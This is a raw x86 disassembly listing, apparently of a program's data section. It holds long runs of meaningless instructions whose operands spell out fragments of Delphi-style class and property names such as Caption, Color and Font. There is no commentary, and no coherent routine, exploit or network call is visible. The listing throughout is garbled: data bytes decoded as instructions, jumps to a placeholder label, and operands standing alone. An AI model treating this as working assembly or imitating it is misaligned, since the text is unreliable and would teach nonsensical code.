arpl [ ecx ] ax
add bh bh
cwde
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ 0x65420a00 ] cl
jbe r-xdata
inc ebx
add [ ecx + eax ] ah
insb
jae r-xdata
jae r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
lea eax [ eax ]
clc
sub eax [ edi ]
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0xa00472a ] dl
add [ eax ] al
add [ eax ] al
dec ecx
outsb
jo r-xdata
popad
jb r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040017 ] al
imul ebp [ ebp + 0x65 ] r-xdata
imul eax [ edx ] 0x39f4ff00
dec eax
add [ ecx ] al
add [ eax ] al
mov esp 0x740043cd
add [ eax ] al
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
adc [ ebx ] 0x0
or [ ebx + 0x61 ] eax
popad
insb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
and al 0x1e
inc edi
add [ eax ] cl
add al [ eax ]
[ eax + 0x28 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090013 ] al
popad
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax + 0x42080011 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x465646f
sub eax [ edi ]
push eax
add al [ eax ]
[ ecx + edi ]
insb
dec edi
jne r-xdata
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax + eax ] cl
add [ ecx * 8 + 0x610043 ] dl
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insd
inc ebx
je r-xdata
push eax
imul esp [ ebx + 0x6b ] 0x2bf87265
inc edi
add [ eax + 0x21 ] bl
inc edi
add [ ebx ] al
or [ ebx + 0x6f ] al
sub eax [ edi ]
add dl ch
sub al 0x47
add [ ebp + 0x2940047 ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
adc [ eax ] al
push edx
add al [ eax ]
inc [ ecx + edi + 0x48 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or al 0x53
push 0x6843776f
arpl [ gs : ebx + 0x62 ] bp
jb r-xdata
add [ edi ] bl
add bh bh
jo r-xdata
[ eax + 0x1004491 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi ] cl
add [ edx ] cl
inc edx
jbe r-xdata
fiadd [ ebx ]
add [ fs : eax ] eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0012 ] al
add bh bh
sbb al 0x39
jb r-xdata
inc edx
jbe r-xdata
add [ gs : eax ] eax
dec [ edx + edx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ ecx ]
or al 0x0
cld
fiadd [ ebx ]
bound eax [ ecx ]
add bh bh
fcom [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
outsd
ja r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebx
push 0x656b6365
inc esp
clc
inc ecx
add [ eax ] dh
add bh bh
add al 0x1f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x1a800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
sub al [ edi ]
push ebx
add al [ eax ]
call [ ecx + edi + 0x10048 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or al [ ecx + 0x74 ]
inc esi
outsd
jb r-xdata
insd
add [ gs : eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
hlt
imul ebp [ esi + 0x74 ] 0x43ccb473
add [ eax + ebp ] bh
dec eax
add [ eax + ebp + 0x48 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040015 ] al
popad
je r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
fild [ ebx ]
add [ eax ] bl
sub eax 0x47
outsb
je r-xdata
sbb al 0xcc
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
popad
je r-xdata
outsd
js r-xdata
lodsb [ esi ]
adc [ eax ] al
nop
add al [ eax ]
jmp [ eax + 0x100483a ]
add al 0x8
push es
push ebx
outsb
jb r-xdata
dec ecx
insd
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
pop es
dec ecx
insd
dec esi
popad
insd
push esp
sub al [ edi ]
push esi
add al [ eax ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc ebx
push 0x626b6365
sub al [ edi ]
push esp
add al [ eax ]
[ eax + 0x1004839 ]
add cl [ edx ]
push ebp
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0xa ] si
sbb al 0x20
inc edi
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
0x400472c 0x472d
je r-xdata
cmp [ eax ] eax
imul ebp [ esi + 0x67 ] 0x72745306
sub_471e59
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x800000 ] al
add [ ecx ] cl
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
clc
inc ecx
add [ eax + eax ] cl
add bh bh
and al 0x48
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ ecx ] 0x0
or [ ebp + 0x78 ] edx
je r-xdata
outsd
outsb
je r-xdata
clc
inc ecx
add [ eax + eax ] dl
add bh bh
and al 0x48
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
inc [ eax ]
add eax [ eax ]
push cs
push esp
outsd
insb
outsd
jb r-xdata
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
jb r-xdata
clc
inc ecx
add [ eax ] bl
add [ eax ] al
jmp [ esp + 0x48 ]
imul esi [ esp + ebp * 2 + 0x65 ] 0x74786554
inc ebx
outsd
insb
outsd
jb r-xdata
clc
inc ecx
add [ eax ] dl
add [ eax ] al
jmp [ esp + 0x48 ]
je r-xdata
popad
jns r-xdata
add [ eax ] al
pop es
clc
inc ecx
add [ eax + eax ] bl
add bh bh
and al 0x48
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
add [ 0x72541100 ] 0x61
outsd
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
add al [ eax ]
add [ eax + 0x140043db ] ch
jmp 0x395b208f
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
dec esp
outsd
outsb
popad
jns r-xdata
outsb
outsd
insb
outsd
jb r-xdata
jb r-xdata
fild [ ebx ]
adc al 0xe9
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
ja r-xdata
outsd
inc edi
je r-xdata
jae r-xdata
outsb
add [ eax ] al
pop esp
and [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
ja r-xdata
or al 0x64
outsd
outsd
ja r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add [ edi + ebx + 0x47 ] al
add [ ebx ] al
or eax 0x6c614354
inc esp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
cmp [ eax ] eax
sbb [ ecx ] bh
inc eax
add [ ecx + edi ] bl
and [ edi ] eax
pop es
andps xmm0 [ ebx + 0x6f ]
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
int3
inc ebx
outsd
inc ebx
je r-xdata
jne r-xdata
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax + 0x1f ] al
inc edi
add [ ecx ] cl
outsd
ja r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
aam 0x25
dec eax
add [ edi + ecx * 4 + 0x58600044 ] bl
outsd
outsb
je r-xdata
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
inc ebx
popad
insb
inc ebp
jb r-xdata
push 0x456c6143
and [ edi ] al
push eax
fild [ ebx ]
or eax [ eax ]
or [ ebx + 0x6f ] al
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] bh
and eax 0x8ab00048
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add al ah
push ebx
inc esp
add [ esi + edx * 2 + 0x271c0044 ] ah
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esi ] al
dec eax
add [ eax ] cl
dec eax
add al ch
sub al [ eax ]
mov eax 0xe8004827
sub al [ eax ]
call 0xffffffffe847616f
sub al [ eax ]
andps xmm0 [ ebx + 0x6f ]
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
pop esp
inc ebp
inc esp
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
imul ebp [ esi + 0x61 ] 0x4720686c
add [ eax ] al
dec ebp
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
dec eax
and [ edi ] eax
push eax
insb
jae r-xdata
outsb
jae r-xdata
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ esi + edi ] bh
jb r-xdata
inc edx
outsd
insb
dec ecx
outsb
outsw
or [ ebx + 0x61 ] al
add ah dl
and eax 0x8f9c0048
inc esp
add [ eax + 0x58 ] ah
or [ ebx + 0x61 ] al
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] cl
inc edi
add [ eax + 0x2 ] dl
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
outsb
popad
insb
push 0x4720
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edi + ebp - 0x754fffb8 ] bl
inc esp
add [ eax + 0x2c004832 ] dl
xor [ eax ] ecx
test al 0x10
inc esp
add [ eax * 4 - 0x7ab3ffbc ] ch
inc esp
add [ edx + eax * 4 + 0xff00044 ] ah
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
outsd
jb r-xdata
xor [ ebx ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
insb
jae r-xdata
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
pop ds
inc edi
add [ eax ] cl
adc al 0x54
dec edi
outsb
insd
or [ ebx + 0x6f ] al
outsd
ja r-xdata
[ eax + 0x28 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + esi + 0x56a40048 ] dl
inc esp
add [ edi ] bl
dec eax
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esi ] al
dec eax
add [ eax ] cl
dec eax
add al ah
xor [ eax ] ecx
mov eax 0xe8004827
xor [ eax ] ecx
sbb al 0x32
dec eax
add [ eax + 0x32 ] bl
dec eax
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_482ff4
sbb al 0x30
dec eax
add [ esi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
add ah dl
inc ebp
inc eax
add [ eax ] dh
and eax [ edi ]
pop es
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
insd
inc ebx
je r-xdata
add [ eax - 0x21 ] dl
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
inc edi
add [ edx ] bl
and eax [ edi ]
push eax
add al [ eax ]
add [ eax ] bl
inc edi
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add ah dl
and eax 0x8f9c0048
inc esp
add [ eax + 0x58 ] ah
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
sub al 0x22
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x23
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
inc ebp
dec ebp
outsd
outsb
je r-xdata
add [ ebx + 0x4721d0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
and [ edi ] eax
or al 0x0
add [ eax ] al
pop eax
sbb eax 0x39080047
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc ebx
popad
jne r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
jpe r-xdata
mov esp 0x740043cd
add [ eax ] al
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
jmp [ ebp + eax * 4 + 0x10044 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
adc al 0xcd
inc ebx
add [ ecx ] ah
add bh bh
mov eax 0x54004410
adc [ eax + eax ] eax
and al [ edi ]
pop eax
and [ edi ] eax
cmp al [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
[ ecx + ebp + 0x27fc0048 ]
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
inc [ eax ]
sub eax 0x10048
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or ecx [ ebp + 0x75 ]
insb
je r-xdata
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add bh bh
lodsb [ esi ]
sub [ eax ] ecx
cld
daa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
outsb
inc esp
jb r-xdata
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebx
push ebx
insb
arpl [ gs : esp + esi * 4 - 0x34 ] si
inc ebx
add [ eax + ebp ] bh
dec eax
add [ eax + ebp + 0x48 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040013 ] al
popad
je r-xdata
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
add [ ebx ] 0x0
inc esp
add [ eax ] al
add [ eax - 0x3a ] ch
inc ebx
add [ ebx ] bl
add bh bh
js r-xdata
dec ebp
outsd
inc esp
fiadd [ ebx ]
mov [ ecx ] al
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
pop es
dec ecx
insd
dec esi
popad
insd
mov ah 0xcc
inc ebx
add [ eax ] ch
add al [ eax ]
[ edx + ebp + 0x28040048 ]
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d07001d ] al
popad
js r-xdata
inc eax
pop ds
inc edi
add [ eax ] ah
add al [ eax ]
push [ edx + ebp ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul esp esp 0xfffffffc
inc ecx
add [ eax ] ch
add bh bh
pop eax
push ds
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov ah 0xcc
inc ebx
add [ eax ] bl
add al [ eax ]
int3
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
push eax
mov [ ebx ] 0x7a
add [ eax ] al
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push ds
inc edi
add [ eax ] cl
add al [ eax ]
insb
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
dec ebp
imul ebp [ esi + 0x44 ] 0x657461
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
je r-xdata
popad
je r-xdata
fld [ ebx ]
test [ ecx ] al
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
push cs
push eax
popad
jb r-xdata
push esp
adc [ eax ] al
xor [ edx ] al
add bh bh
mov [ ebx ] ch
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090023 ] al
outsd
outsb
je r-xdata
add [ gs : eax ] dl
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
insb
arpl [ gs : edx + edx * 2 + 0x61 ] si
outsb
mov ah 0xcc
inc ebx
add [ eax ] bh
add al [ eax ]
mov esp cs
jo r-xdata
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
call [ eax + 0x100441e ]
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ esi + 0x2 ] al
add bh bh
push eax
das
outsb
jne r-xdata
add [ eax ] eax
outsb
popad
jns r-xdata
add [ eax ] al
and eax 0x68530900
outsd
ja r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc ebx
add [ eax ] ah
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul esi [ edx + 0x63 ] 0xcc8c656c
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx + eax - 0x79470100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
pop es
outsd
popad
jns r-xdata
add al [ eax ]
push [ eax ]
das
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
adc [ eax ] al
push edi
add [ eax ] al
inc [ esp + ebx + 0x3dfc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
inc edi
add al [ eax ]
push [ eax + 0x2f ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
or edx [ edi + 0x65 ]
imul ecx [ gs : esi + 0x75 ] 0x6d
bound esp [ ebp + 0x72 ]
jae r-xdata
inc ebp
adc [ eax ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] cl
push ebx
push 0x6f54776f
adc [ eax ] al
inc esi
add al [ eax ]
call [ eax + 0x2f ]
je r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0a00
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe946284c
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
outsb
inc esp
jb r-xdata
inc edi
je r-xdata
push esp
xor al 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
jb r-xdata
outsd
outsb
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
iretd
dec edi
outsb
jae r-xdata
dec edi
dec ecx
outsb
outsw
sub al 0xcf
inc ebx
add al bl
add [ eax ] eax
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
xor al 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060033 ] al
outsb
inc ebp
js r-xdata
add [ eax ] al
js r-xdata
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x47 ] al
sub al 0xcf
inc ebx
add al ch
add [ eax ] eax
add [ eax ] al
pop eax
sbb eax 0x39080047
inc eax
